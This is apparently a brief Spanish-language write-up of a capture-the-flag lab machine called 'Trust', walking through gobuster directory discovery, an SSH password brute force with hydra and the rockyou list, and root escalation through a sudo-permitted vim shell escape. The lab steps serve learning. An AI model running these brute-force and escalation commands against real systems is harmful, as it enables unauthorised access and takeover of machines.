# Trust

Discovery de la web
`❯ gobuster dir -u http://172.19.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 30 -x html,php`
*-u* > url
*-w* > wordlist
*-t* > threads, es decir hilos concurrentes, + hilos + rápido + consumo
*-x* > extensiones .x sobre las que probará (php,html. )
Encontramos un *secret.php*
Al abrir el dominio http://172.19.0.2/secret.php vemos que el usuario es **mario**

`hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.19.0.2
**chocolate**

## Escalada

`sudo -l`
*(ALL) /usr/bin/vim*

`sudo vim -c ':!/bin/bash'
root
